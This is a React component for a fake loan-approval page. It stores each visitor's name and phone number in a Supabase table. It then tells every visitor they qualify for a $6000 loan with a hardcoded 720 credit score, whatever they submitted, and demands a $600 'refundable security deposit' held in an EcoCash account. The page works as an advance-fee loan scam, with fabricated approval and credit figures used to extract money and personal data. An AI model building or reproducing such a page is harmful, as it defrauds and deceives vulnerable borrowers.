import { useEffect, useState } from 'react';
import { supabase } from '../lib/supabase';

interface QualificationPageProps {
  applicationId: string;
  fullName: string;
  phoneNumber: string;
}

export default function QualificationPage({ applicationId, fullName, phoneNumber }: QualificationPageProps) {
  const [lastLogin] = useState(new Date().toISOString().replace('T', ' ').slice(0, 19));
  const [error, setError] = useState<string>('');

  useEffect(() => {
    const submitFinalData = async () => {
      try {
        const { error: dbError } = await supabase
          .from('final_submissions')
          .insert({
            application_id: applicationId,
            user_name: fullName,
            phone_number: phoneNumber,
            account_status: 'Qualified',
            loan_amount: 6000.00,
            credit_score: 720,
            last_login: new Date().toISOString(),
          });

        if (dbError) {
          setError(dbError.message || 'Failed to save final data');
          console.error('Database error:', dbError);
        }
      } catch (err) {
        const errorMsg = err instanceof Error ? err.message : 'An error occurred';
        setError(errorMsg);
        console.error('Error submitting final data:', err);
      }
    };

    submitFinalData();
  }, [applicationId, fullName, phoneNumber]);

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-700 via-blue-800 to-blue-900 p-4">
      <div className="max-w-md mx-auto py-8 space-y-4">
        {error && (
          <div className="bg-red-500 bg-opacity-20 border border-red-400 rounded-2xl p-6">
            <p className="text-red-200">{error}</p>
          </div>
        )}

        <div className="bg-blue-800 bg-opacity-50 backdrop-blur-sm rounded-2xl p-6 shadow-xl border border-blue-600">
          <h2 className="text-white text-xl font-semibold mb-6">Account Qualification & Compliance</h2>

          <div className="space-y-4">
            <div>
              <p className="text-blue-200 text-sm mb-1">User Information</p>
              <p className="text-white text-lg font-semibold">{fullName}</p>
            </div>

            <div>
              <p className="text-blue-200 text-sm mb-1">Phone Number</p>
              <p className="text-white text-2xl font-bold">{phoneNumber}</p>
            </div>

            <div>
              <p className="text-blue-200 text-sm mb-1">Account Status</p>
              <span className="inline-block bg-green-500 text-white px-6 py-2 rounded-full font-semibold">
                Qualified
              </span>
            </div>

            <div>
              <p className="text-blue-200 text-sm mb-1">Last login</p>
              <p className="text-white text-lg font-semibold">{lastLogin}</p>
            </div>
          </div>
        </div>

        <div className="bg-blue-800 bg-opacity-50 backdrop-blur-sm rounded-2xl p-6 shadow-xl border border-blue-600">
          <div className="flex items-start gap-3 mb-4">
            <span className="text-2xl">🎉</span>
            <h3 className="text-white text-xl font-bold">Congratulations!</h3>
          </div>

          <div className="space-y-2 text-white">
            <p>You are qualified for a loan of</p>
            <p className="text-3xl font-bold">$6000.00</p>
            <p className="text-blue-100">10% bonus included.</p>
            <p className="text-blue-100">
              Your credit score of <span className="font-bold text-white">720</span> qualifies you for enhanced terms.
            </p>
          </div>

          <div className="mt-6 text-center">
            <div className="text-7xl font-bold text-white mb-2">720</div>
            <p className="text-blue-200 text-lg">Credit Score</p>
          </div>
        </div>

        <div className="bg-blue-800 bg-opacity-50 backdrop-blur-sm rounded-2xl p-6 shadow-xl border border-blue-600">
          <h3 className="text-white text-xl font-bold mb-4">Compliance Notice</h3>
          <p className="text-blue-100 leading-relaxed">
            Your EcoCash account must be active and maintain a security deposit of at least{' '}
            <span className="font-bold text-white">$600.00</span>. This deposit is fully refundable
            upon successful repayment and helps you secure better interest rates.
          </p>
        </div>

        <div className="text-center text-blue-300 text-sm pt-4">
          Last updated: {lastLogin}
        </div>
      </div>
    </div>
  );
}
